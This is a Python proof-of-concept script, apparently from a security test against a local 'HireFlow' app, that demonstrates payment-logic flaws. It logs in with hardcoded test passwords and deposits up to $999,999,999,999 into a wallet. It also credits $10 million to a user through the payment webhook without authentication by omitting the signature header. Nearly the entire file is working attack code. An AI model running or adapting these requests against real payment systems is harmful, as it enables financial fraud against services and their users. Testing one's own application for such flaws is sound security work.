#!/usr/bin/env python3
"""
WSTG-BUSL-01: Excessive Deposit - No Maximum Validation

Vulnerability: The deposit endpoint POST /api/payments/wallet/deposit has
no maximum deposit validation. While it checks that amount > 0, it does not
cap the maximum amount. An attacker can deposit extreme amounts like
$999,999,999,999 (99999999900000 cents) into their wallet.

Additionally, the payment webhook bypass (no signature check when header
is omitted) can be used to credit arbitrary amounts to any user's wallet
without even needing authentication.

The deposit controller converts dollars to cents:
    const cents = Math.round(parseFloat(amount) * 100);

The service only checks: if (amount <= 0) throw error

Impact: Financial fraud. Users can create arbitrarily large wallet balances,
potentially enabling fund transfers or withdrawals of fabricated amounts.
"""

import requests
import sys

BASE_URL = "http://localhost:3000"
CLIENT_ACCOUNTS = [
    {"email": "testclient@hireflow.com", "password": "password123"},
    {"email": "mark.stevens@techvault.io", "password": "password123"},
    {"email": "lisa.chen@brightpath.com", "password": "password123"},
]


def try_login(accounts):
    for creds in accounts:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
        if resp.status_code == 200:
            return resp.json()["token"], resp.json()["user"]
    print("    ERROR: No account could be logged in.")
    sys.exit(1)


def get_wallet(token):
    resp = requests.get(
        f"{BASE_URL}/api/payments/wallet",
        headers={"Authorization": f"Bearer {token}"}
    )
    if resp.status_code != 200:
        return None
    return resp.json()


def main():
    print("=" * 70)
    print("WSTG-BUSL-01: No Maximum Deposit Validation")
    print("=" * 70)

    # Step 1: Login and check initial balance
    print("\n[1] Logging in and checking initial balance...")
    token, user = try_login(CLIENT_ACCOUNTS)
    headers = {"Authorization": f"Bearer {token}"}
    print(f"    User: {user['email']}")

    wallet_before = get_wallet(token)
    if wallet_before:
        balance_before = int(wallet_before.get("balance", 0))
        print(f"    Current balance: {balance_before} cents (${balance_before/100:.2f})")

    # Step 2: Attempt extremely large deposit
    print("\n[2] Attempting deposit of $999,999,999,999...")
    extreme_amount = 999999999999  # dollars

    resp = requests.post(
        f"{BASE_URL}/api/payments/wallet/deposit",
        json={
            "amount": extreme_amount,
            "description": "Extreme deposit test"
        },
        headers=headers
    )

    print(f"    Status: {resp.status_code}")

    if resp.status_code == 200:
        result = resp.json()
        wallet = result.get("wallet", {})
        txn = result.get("transaction", {})
        new_balance = int(wallet.get("balance", 0))
        print(f"    [VULNERABLE] Deposit accepted!")
        print(f"    New balance: {new_balance} cents (${new_balance/100:.2f})")
        print(f"    Transaction amount: {txn.get('amount', 'N/A')} cents")
        print(f"    Transaction type: {txn.get('type', 'N/A')}")
    else:
        print(f"    Response: {resp.text[:200]}")

    # Step 3: Try another large deposit
    print("\n[3] Attempting another deposit of $1,000,000,000...")
    resp2 = requests.post(
        f"{BASE_URL}/api/payments/wallet/deposit",
        json={
            "amount": 1000000000,
            "description": "Billion dollar deposit"
        },
        headers=headers
    )

    print(f"    Status: {resp2.status_code}")
    if resp2.status_code == 200:
        wallet2 = resp2.json().get("wallet", {})
        print(f"    [VULNERABLE] Another massive deposit accepted!")
        print(f"    Balance now: ${int(wallet2.get('balance', 0))/100:.2f}")

    # Step 4: Demonstrate webhook bypass for arbitrary credits
    print("\n[4] Using webhook bypass to credit $10,000,000 (no auth needed)...")
    webhook_amount = 1000000000  # 10 million dollars in cents

    resp_wh = requests.post(
        f"{BASE_URL}/api/webhooks/payment",
        json={
            "event": "payment.completed",
            "data": {
                "user_id": user["id"],
                "amount": webhook_amount,
                "reference_id": None,
                "description": "Massive arbitrary credit via webhook bypass"
            }
        }
        # No x-payment-signature header - bypasses verification
    )

    print(f"    Status: {resp_wh.status_code}")
    if resp_wh.status_code == 200:
        print(f"    [VULNERABLE] Webhook credit of {webhook_amount} cents accepted!")
        print(f"    Response: {resp_wh.json()}")

    # Step 5: Check final balance
    print(f"\n[5] Checking final wallet balance...")
    wallet_final = get_wallet(token)
    if wallet_final:
        final_balance = int(wallet_final.get("balance", 0))
        print(f"    Final balance: {final_balance} cents (${final_balance/100:.2f})")

        if balance_before is not None:
            total_added = final_balance - balance_before
            print(f"    Total added: {total_added} cents (${total_added/100:.2f})")

    # Step 6: Show there is validation for negative amounts (but no max)
    print(f"\n[6] Confirming negative amounts ARE rejected...")
    resp_neg = requests.post(
        f"{BASE_URL}/api/payments/wallet/deposit",
        json={"amount": -100},
        headers=headers
    )
    print(f"    Deposit of -$100 status: {resp_neg.status_code}")
    if resp_neg.status_code == 400:
        print(f"    Correctly rejected: {resp_neg.json().get('error', 'N/A')}")
        print(f"    But no upper limit - any positive amount is accepted!")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: No maximum deposit validation confirmed.")
    print("  - Any positive amount accepted (up to JavaScript number limits)")
    print("  - No server-side cap on deposit amounts")
    print("  - Combined with webhook bypass: unlimited credits, no auth needed")
    print("  - Users can fabricate arbitrary wallet balances")
    print("=" * 70)


if __name__ == "__main__":
    main()
